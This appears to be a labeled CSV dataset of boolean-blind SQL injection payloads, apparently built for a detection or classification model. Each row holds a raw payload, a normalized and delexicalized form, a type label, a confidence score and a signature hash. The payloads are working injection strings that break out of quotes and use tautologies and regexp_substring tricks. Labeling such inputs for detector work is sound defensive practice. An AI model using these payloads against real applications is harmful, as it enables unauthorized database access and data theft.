id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
24750,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0047ba2b,silver
24886,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'vwtq' = 'vwtq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'vwtq' = 'vwtq",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0047ba2b,silver
25077,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'bdsq' like 'bdsq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'bdsq' like 'bdsq",False,0,"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",0047ba2b,silver
2673,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) -- bqxe",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) -- bqxe",False,0,"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",0053fca4,silver
20848,"-1863' ) or make_set ( 9354 = 9354,7185 ) and ( 'whwv' = 'whwv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1,"-1863' ) or make_set ( 9354 = 9354,7185 ) and ( 'whwv' = 'whwv",False,0,-1863__STR__whwv__STR__whwv,00d2fa88,silver
19959,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2,"-1439"" or 2849 = 8484 and ""pmdl"" = ""pmdl",False,0,-1439__STR__pmdl__STR__pmdl,00dc2a4f,silver
32754,hi or a = a,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,1,hi or a = a,False,0,__IDENT__ or __IDENT__ = __IDENT__,01503c62,silver
2007,"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2,"1"" ) ) as qhnb where 8302 = 8302 and ( 3020 = 3020 ) *6703--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",017b7d82,silver
25401,"1"" ) ) as jikg where 8258 = 8258 and ( 3973 = 1047 ) *1047--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2,"1"" ) ) as jikg where 8258 = 8258 and ( 3973 = 1047 ) *1047--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",017b7d82,silver
19221,-1479%' or 5201 = 3398--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2,-1479%' or 5201 = 3398--,False,0,-__INT__ % ' or __INT__ = __INT__ --,017fae64,silver
25594,-3520%' or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2,-3520%' or 8571 = 8571--,False,0,-__INT__ % ' or __INT__ = __INT__ --,017fae64,silver
23975,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",False,0,1__STR__zuhv__STR__zuhv,01c0e2ae,silver
19370,"1"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__"" ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",020a2356,silver
1269,"1"" and make_set ( 6520 = 9958,9958 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,1,"1"" and make_set ( 6520 = 9958,9958 )",False,0,"__INT__"" and __IDENT__ ( __INT__ = __INT__ , __INT__ )",02815486,silver
2027,"1"" and make_set ( 8403 = 8403,8899 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,1,"1"" and make_set ( 8403 = 8403,8899 )",False,0,"__INT__"" and __IDENT__ ( __INT__ = __INT__ , __INT__ )",02815486,silver
1786,"1%"" ) ) ) and 3116 = 9088#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2,"1%"" ) ) ) and 3116 = 9088#",False,0,"__INT__ % "" ) ) ) and __INT__ = __INT__#",029698c8,silver
24058,"1%"" ) ) ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2,"1%"" ) ) ) and 4595 = 4595#",False,0,"__INT__ % "" ) ) ) and __INT__ = __INT__#",029698c8,silver
1395,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'rqyz' = 'rqyz",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'rqyz' = 'rqyz",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",02d6fa44,silver
21795,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""lsca"" like ""lsca",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""lsca"" like ""lsca",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",02d6fa44,silver
23093,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""rphs"" = ""rphs",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""rphs"" = ""rphs",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",02d6fa44,silver
24153,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'qutm' = 'qutm",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'qutm' = 'qutm",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",02d6fa44,silver
24993,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'sqni' like 'sqni",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'sqni' like 'sqni",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",02d6fa44,silver
643,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = '__IDENT__",0304bd1d,silver
20746,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'yaml' = 'yaml",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'yaml' = 'yaml",False,0,"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = '__IDENT__",0304bd1d,silver
11304,a' or 1 = 1,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 11 chars.,2,a' or 1 = 1,False,0,__IDENT__' or __INT__ = __INT__,03e8a0e6,silver
22462,-8032%' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-8032%' ) ) ) or 9323 = 9323#,False,0,-__INT__ % ' ) ) ) or __INT__ = __INT__#,0401b45e,silver
23011,-3938%' ) ) ) or 2034 = 7209#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-3938%' ) ) ) or 2034 = 7209#,False,0,-__INT__ % ' ) ) ) or __INT__ = __INT__#,0401b45e,silver
429,"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",045698e1,silver
968,"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",045698e1,silver
22423,"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",045698e1,silver
24199,"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2,"-9434"" ) as cqlw where 1600 = 1600 or 2733 = 1047--",False,0,"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",045698e1,silver
23094,"-2568"" ) or ( 8459 = 8459 ) *4906 and ( ""exyw"" = ""exyw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1,"-2568"" ) or ( 8459 = 8459 ) *4906 and ( ""exyw"" = ""exyw",False,0,-2568__STR__exyw__STR__exyw,04638bc8,silver
23445,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'ufbr' = 'ufbr",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'ufbr' = 'ufbr",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = '__IDENT__",04a2d4e6,silver
2490,-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm' like 'agcm,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1,-8370' ) ) or ( 3501 = 6407 ) *6407 and ( ( 'agcm' like 'agcm,False,0,-8370__STR__agcm__STR__agcm,04c316a5,silver
1014,-8410' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-8410' ) ) ) or 8571 = 8571--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
1524,-6122' ) ) ) or 9243 = 6161--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-6122' ) ) ) or 9243 = 6161--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
1798,-7453' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-7453' ) ) ) or 8571 = 8571--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
20019,-2717' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-2717' ) ) ) or 8571 = 8571--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
24614,-8636' ) ) ) or 4301 = 7212--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-8636' ) ) ) or 4301 = 7212--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
24779,-5113' ) ) ) or 7200 = 3094--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2,-5113' ) ) ) or 7200 = 3094--,False,0,-__INT__' ) ) ) or __INT__ = __INT__ --,04c94cb6,silver
18606,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'frpo' like 'frpo",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'frpo' like 'frpo",False,0,"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ like '__IDENT__",05100ce7,silver
2434,"1"" ) ) as rign where 1604 = 1604 and 3661 = 3054--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,"1"" ) ) as rign where 1604 = 1604 and 3661 = 3054--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",053b4e6a,silver
20089,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",053b4e6a,silver
21621,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",053b4e6a,silver
21651,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",053b4e6a,silver
20253,"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",057a90d1,silver
21768,"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",057a90d1,silver
24817,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 3039 = 3039",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 3039 = 3039",False,0,"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __INT__ = __INT__",05d97707,silver
1897,1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2,1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,False,0,1__STR__ktlz__STR__ktlz,05db741c,silver
425,"-4670"" ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-4670"" ) ) or 3038 = 3038",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
739,"-6076"" ) ) or 8277 = 4757",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-6076"" ) ) or 8277 = 4757",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
19543,"-1907"" ) ) or 2782 = 3591",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-1907"" ) ) or 2782 = 3591",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
20574,"-6848"" ) ) or 4071 = 5312",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-6848"" ) ) or 4071 = 5312",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
20963,"-5148"" ) ) or 5310 = 8229",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-5148"" ) ) or 5310 = 8229",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
23446,"-8245"" ) ) or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2,"-8245"" ) ) or 3038 = 3038",False,0,"-__INT__"" ) ) or __INT__ = __INT__",0631fbbe,silver
2540,"1 where 8905 = 8905 and make_set ( 7654 = 1923,1923 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,2,"1 where 8905 = 8905 and make_set ( 7654 = 1923,1923 ) --",False,0,"__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",065c63ab,silver
23409,"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 56 chars.,2,"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",False,0,"__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",065c63ab,silver
